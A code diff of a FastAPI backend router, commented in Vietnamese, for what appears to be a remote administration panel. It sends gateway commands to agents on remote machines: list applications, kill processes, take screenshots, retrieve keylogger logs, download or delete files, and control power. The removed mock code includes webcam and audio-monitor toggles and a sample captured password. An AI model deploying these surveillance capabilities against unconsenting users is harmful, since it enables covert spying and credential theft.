@@ -1,11 +1,14 @@
 # web-app/backend/routers/modules.py
-from fastapi import APIRouter, HTTPException, status
+from fastapi import APIRouter, HTTPException, status, Depends  # 🌟 Thêm Depends vào đây
 from pydantic import BaseModel
+from core.gateway_client import gateway_client  
+from core.security import get_current_user  # 🛡️ Nhập ổ khóa gác cổng từ file security
 
-# 🚪 Tạo phòng riêng quản lý lệnh điều khiển của đầy đủ 8 module
 router = APIRouter(prefix="/api/modules", tags=["Modules Control"])
 
-# --- 📦 KHUÔN MẪU DỮ LIỆU ĐẦU VÀO (REQUEST BODY) ---
+# =====================================================================
+# 📦 KHUÔN MẪU DỮ LIỆU ĐẦU VÀO
+# =====================================================================
 class KillProcessRequest(BaseModel):
     machine_id: str
     pid: int
@@ -13,93 +16,125 @@ class KillProcessRequest(BaseModel):
 
 class PowerRequest(BaseModel):
     machine_id: str
-    action: str
+    action: str  # "shutdown", "restart", "lock", "sleep"
 
 class FileActionRequest(BaseModel):
     machine_id: str
-    path: str
-    action: str # "download", "upload", "delete", "view"
+    file_path: str
+    action: str  # "download", "view", "delete"
 
 
-# --- ⚙️ 1. MODULE PROCESSES (TIẾN TRÌNH) ---
-@router.post("/kill-process")
-def kill_process(data: KillProcessRequest):
-    return {
-        "status": "success",
-        "message": f"Đã phát lệnh dừng tiến trình {data.process_name} (PID: {data.pid}) trên máy {data.machine_id}."
-    }
+# =====================================================================
+# 🛠️ ĐẦU NỐI CHI TIẾT ĐÃ ĐƯỢC BẢO MẬT (TẤT CẢ PHẢI QUADepends)
+# =====================================================================
 
-
-# --- 🔌 2. MODULE POWER CONTROL (NGUỒN MÁY) ---
-@router.post("/power")
-def power_control(data: PowerRequest):
-    if data.action not in ["shutdown", "restart"]:
-        raise HTTPException(status_code=400, detail="Hành động nguồn không hợp lệ!")
-    return {
-        "status": "success",
-        "message": f"Đã phát lệnh {data.action.upper()} tới thiết bị {data.machine_id}."
-    }
-
-
-# --- 📁 3. MODULE FILE EXPLORER (QUẢN LÝ FILE) ---
-@router.post("/files")
-def file_control(data: FileActionRequest):
-    return {
-        "status": "success",
-        "message": f"Đã thực hiện hành động [{data.action.upper()}] tại đường dẫn '{data.path}' của máy {data.machine_id}."
-    }
-
-
-# --- 📺 4. MODULE LIVE SCREEN (YÊU CẦU CHỤP MÀN HÌNH CHỦ ĐỘNG) ---
-@router.get("/screen/{machine_id}")
-def trigger_screen_capture(machine_id: str):
-    # Trả về một link ảnh mới sau khi ra lệnh chụp
-    return {
-        "status": "success",
-        "machine_id": machine_id,
-        "screenshot_url": f"https://via.placeholder.com/800x450.png?text=Screen+Captured+From+{machine_id}"
-    }
-
-
-# --- ⌨️ 5. MODULE KEYLOGGER (LẤY NHẬT KÝ PHÍM BẤM) ---
-@router.get("/keylogger/{machine_id}")
-def get_keylogger_logs(machine_id: str):
-    return {
-        "status": "success",
-        "machine_id": machine_id,
-        "logs": f"--- Nhật ký từ máy {machine_id} ---\n[User gõ]: gmail.com\n[User gõ]: matkhauhuywiet\n[Hệ thống]: Mở Word"
-    }
-
-
-# --- 📦 6. MODULE APPLICATIONS (DANH SÁCH PHẦN MỀM) ---
+# 1️⃣ 📁 Applications: Xem danh sách phần mềm đang chạy
 @router.get("/applications/{machine_id}")
-def get_installed_applications(machine_id: str):
-    return {
-        "status": "success",
-        "machine_id": machine_id,
-        "apps": [
-            {"name": "Google Chrome", "Developer": "Google LLC", "Version": "120.0"},
-            {"name": "Python 3.10", "Developer": "Python Software Foundation", "Version": "3.10.5"},
-            {"name": "AnyDesk", "Developer": "AnyDesk Software GmbH", "Version": "7.1.13"}
-        ]
-    }
+async def get_applications(machine_id: str, current_user: str = Depends(get_current_user)):
+    try:
+        agent_data = await gateway_client.send_command_and_wait(
+            machine_id=machine_id,
+            module="applications",
+            action="list"
+        )
+        return {
+            "status": "success",
+            "machine_id": machine_id,
+            "apps": agent_data.get("apps", [])
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
 
 
-# --- 📷 7. MODULE WEBCAM (YÊU CẦU BẬT CỦA WEBCAM) ---
-@router.get("/webcam/{machine_id}/toggle")
-def toggle_webcam(machine_id: str, active: bool):
-    status_str = "MỞ" if active else "TẮT"
-    return {
-        "status": "success",
-        "message": f"Đã gửi yêu cầu {status_str} Webcam trên máy {machine_id}."
-    }
+# 2️⃣ ⚙️ Processes: Ra lệnh tắt một tiến trình ngầm (Task Manager)
+@router.post("/processes/kill")
+async def kill_process(data: KillProcessRequest, current_user: str = Depends(get_current_user)):
+    try:
+        # Gửi payload chứa PID chính xác mà Frontend yêu cầu hạ lệnh xuống Agent
+        await gateway_client.send_command_and_wait(
+            machine_id=data.machine_id,
+            module="processes",
+            action="kill",
+            payload={"pid": data.pid}
+        )
+        return {
+            "status": "success",
+            "message": f"Đã phát lệnh dừng tiến trình {data.process_name} (PID: {data.pid}) trên máy {data.machine_id}."
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
 
 
-# --- 🎙️ 8. MODULE AUDIO MONITOR (GIÁM SÁT ÂM THANH) ---
-@router.get("/audio/{machine_id}/toggle")
-def toggle_audio_monitor(machine_id: str, active: bool):
-    status_str = "BẬT CHẾ ĐỘ GHI ÂM" if active else "TẮT GHI ÂM"
-    return {
-        "status": "success",
-        "message": f"Đã gửi lệnh {status_str} gửi về hệ thống từ máy {machine_id}."
-    }
+# 3️⃣ 📸 Screenshot: Chụp màn hình đơn lẻ theo yêu cầu
+@router.get("/screenshot/{machine_id}")
+async def trigger_screenshot(machine_id: str, current_user: str = Depends(get_current_user)):
+    try:
+        agent_data = await gateway_client.send_command_and_wait(
+            machine_id=machine_id,
+            module="screenshot",
+            action="capture"
+        )
+        return {
+            "status": "success",
+            "machine_id": machine_id,
+            "screenshot_base64": agent_data.get("image_base64")
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+# 5️⃣ ⌨️ Keylogger: Xem nhật ký phím gõ được
+@router.get("/keylogger/{machine_id}")
+async def get_keylogger(machine_id: str, current_user: str = Depends(get_current_user)):
+    try:
+        agent_data = await gateway_client.send_command_and_wait(
+            machine_id=machine_id,
+            module="keylogger",
+            action="get_logs"
+        )
+        return {
+            "status": "success",
+            "machine_id": machine_id,
+            "logs": agent_data.get("logs", "Không có dữ liệu nhật ký mới.")
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+# 6️⃣ 📥 File Management: Thao tác file (Download/View/Delete)
+@router.post("/file-download/action")
+async def file_download_action(data: FileActionRequest, current_user: str = Depends(get_current_user)):
+    try:
+        agent_data = await gateway_client.send_command_and_wait(
+            machine_id=data.machine_id,
+            module="file",
+            action=data.action,
+            payload={"file_path": data.file_path}
+        )
+        return {
+            "status": "success",
+            "message": f"Đã gửi lệnh thực hiện hành động [{data.action.upper()}] tới file '{data.file_path}' trên máy {data.machine_id}.",
+            "data": agent_data
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+# 8️⃣ 🔌 Power Control: Điều khiển Nguồn máy tính từ xa
+@router.post("/power/control")
+async def power_control(data: PowerRequest, current_user: str = Depends(get_current_user)):
+    if data.action not in ["shutdown", "restart", "lock", "sleep"]:
+        raise HTTPException(status_code=400, detail="Hành động nguồn không hợp lệ!")
+    
+    try:
+        await gateway_client.send_command_and_wait(
+            machine_id=data.machine_id,
+            module="power",
+            action=data.action
+        )
+        return {
+            "status": "success",
+            "message": f"Đã phát lệnh {data.action.upper()} tới thiết bị {data.machine_id} thành công sau khi được User xác nhận."
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
